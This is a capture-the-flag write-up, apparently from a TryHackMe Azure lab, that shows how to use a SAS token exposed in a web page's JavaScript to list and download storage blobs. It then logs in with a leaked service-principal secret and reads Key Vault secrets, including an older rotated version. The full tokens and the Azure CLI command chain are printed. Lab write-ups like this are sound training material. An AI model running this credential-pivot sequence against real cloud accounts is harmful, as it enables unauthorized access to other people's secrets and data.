# Day 9: CryptoCabana

|Category|Difficulty|
|:------:|:--------:|
| Cloud  |  Medium  |

**Skills learned:**
* Azure CLI installation and configuration
* Azure CLI commands to access cloud resources

## Concierge Briefing
By the time he made it back from the breakfast buffet, his wallet had already moved on without him. The transaction was signed, properly signed, just not by him.
He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault: the one whose landing page promised, in exactly four words, “Backed up. Sleep easy.” Somewhere between that promise and this morning, something else got a good look at what was supposed to stay behind glass.
Your objective: find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends.

## Today's Itinerary
* Pull apart what the kiosk hands out for free before you've even clicked anything
* Follow that trust somewhere the kiosk's own page never once points you
* Somewhere in there is a second, more valuable set of keys, and a vault that won't give up the real values on the first ask

## Provided Hint
*[Image: day9_hint]*

## Azure CLI Installation Steps
I found [installation steps](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-linux?view=azure-cli-latest&pivots=apt) from Microsoft and used the 'Install with one command' option:
`curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash` then `sudo apt-get install azure-cli`.

Confirm that the installation was successful by using the command `az --version`.

## Azure CLI Configuration
Obtain your lab credentials from TryHackMe by clicking the **Cloud Details** button, then **Join Lab**. Opening the **Credentials** tab will show you the username and temporary access pass to use.

*[Image: day9_joinLab]*

Use the command `az login` to log in to Azure with our provided credentials. This will open the web browser where you need to enter the provided username and temporary access pass. After entering them, the terminal should show the THM CTF subscription and tenant. Hitting the **enter key** here will log us in under this tenant/subscription.

*[Image: day9_azureLogin]*

Confirm your CLI has been configured using the command `az account show`. You should see THM CTF account data.

## Initial Steps
To begin, I opened the web app: https://cryptocabanaf5scjagc.z13.web.core.windows.net/ 

We see this page which asks for a twelve word recovery phrase to backup a vault:

*[Image: day9_webApp]*

Examining the source code of the page provided one clue. There is a script `<script src="app.js"></script>` running. Pivot to this page and examine its source provides a few more clues:
```js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");
  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed â€” network error.";
    });
}
```

Now we have a few useful values that can help us find the flag from the cloud resources.
```
STORAGE_ACCOUNT = "cryptocabanaf5scjagc"
BACKUPS_CONTAINER = "backups"
BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

## Finding the Flag
Using the [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest) reference guide, we can start accessing the resources behind https://cryptocabanaf5scjagc.z13.web.core.windows.net/. 

I started by listing all containers in the account with `az storage container list`, using the **account-name** and **sas-token** discovered in the `app.js` source code:
```
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --query "[].name" -o table
```

The output gave us the names of three containers:
```
Result
--------
$web
backups
vault
```

I then started listing what blobs exist in these containers with `az storage blob list`, starting with **vault**:
```
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --query "[].name" -o table
```

We've found two files in the vault container:
```
Result
---------------------------
backup-service-account.json
seed_phrase.txt
```

We can download each blob using `az storage blob download`, providing the container name, blob name and sas-token. It will save a copy of the blob in the name you provide with the **--file** flag.
```
 az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name backup-service-account.json \
  --file HHserviceacct.json \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

Read the contents of the downloaded blob with the `cat` command. In my example, I used `cat HHserviceacct.json`:
```json
{"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5","client_secret":"UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg","key_vault_name":"ccabana-kv-f5scjagc","key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/","note":"CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT","tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"}  
```

This blob actually contains credentials for the *CryptoCabana automation account*. We can use these credentials to log in as this account using the CLI command `az login`:
```
az login --service-principal --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 --password UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

With our new credentials, we can now pivot to listing the contents of the **key_vault** found with the service account details:
`az keyvault secret list --vault-name ccabana-kv-f5scjagc`. The vault contains three **key-shard** files and a **master-key** file, including:
```json
 {
    "attributes": {
      "created": "2026-07-19T15:21:07+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 7,
      "recoveryLevel": "CustomizedRecoverable+Purgeable",
      "updated": "2026-07-19T15:21:07+00:00"
    },
    "contentType": "",
    "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1",
    "managed": null,
    "name": "key-shard-1",
    "tags": {}
  },
```

Using `az keyvault secret show`, we can see the value of each key shard:
`az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1`:
```json
{
  "attributes": {
    "created": "2026-07-19T15:21:07+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 7,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2026-07-19T15:21:07+00:00"
  },
  "contentType": "",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1/b0554e11de4940eaa8e8bc79203646ef",
  "kid": null,
  "managed": null,
  "name": "key-shard-1",
  "tags": {},
  "value": "THM{n0t_ur"
}
```

We can see that each key shard contains part of the flag! However: the value of key-shard-2 is: *"Rotated this after IT flagged it: old value should still be recoverable if you know where to look."* Now we need to find the older version of the key-shard-2 to finish finding the flag. This can be done using `az keyvault secret list-versions`.

Find the older version of key-shard-2 using `az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2`:
```json
 {
    "attributes": {
      "created": "2026-07-28T01:05:05+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 7,
      "recoveryLevel": "CustomizedRecoverable+Purgeable",
      "updated": "2026-07-28T01:05:05+00:00"
    },
    "contentType": null,
    "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0",
    "managed": null,
    "name": "key-shard-2",
    "tags": {
      "file-encoding": "utf-8"
    }
  },
```

Now that we know which version of **key-shard-2** may contain the final part of the flag, we can grab its contents using `az keyvault secret show` providing the version's **id**: `az keyvault secret show --id https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0 `:
```json
{
  "attributes": {
    "created": "2026-07-28T01:05:05+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 7,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2026-07-28T01:05:05+00:00"
  },
  "contentType": null,
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0",
  "kid": null,
  "managed": null,
  "name": "key-shard-2",
  "tags": {
    "file-encoding": "utf-8"
  },
  "value": "_k3ys_n0t_"
}
```

## Flag
Putting all the flag fragments together from the key-shard files gives us the full flag.
**THM{n0t_ur_\*\*\*\*_\*\*\*_\*\*_\*\*\*\*\*\*}**